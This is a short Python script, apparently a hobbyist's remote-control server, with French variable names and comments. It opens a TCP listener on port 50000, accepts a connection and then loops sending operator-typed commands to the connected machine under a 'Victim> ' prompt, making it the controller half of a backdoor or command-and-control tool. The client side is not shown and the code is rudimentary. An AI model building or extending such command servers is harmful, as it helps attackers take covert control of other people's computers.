#Server
import socket
from threading import Thread
import time

yaisse = 0
nombrlol = 0

def envoyer(envoitexte):
    conn.sendall(str(envoitexte).encode("utf-8"))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('localhost', 50000))
s.listen(1)
conn, addr = s.accept()
while 1:
    data = conn.recv(1024)
    if not data:
        break
    conn.sendall(data)
    if data:
        yaisse = 1
    if yaisse == 1:
        #enlever while true si bug
        while True:
            komand = input("Victim> ")
            envoyer(str(komand))
    
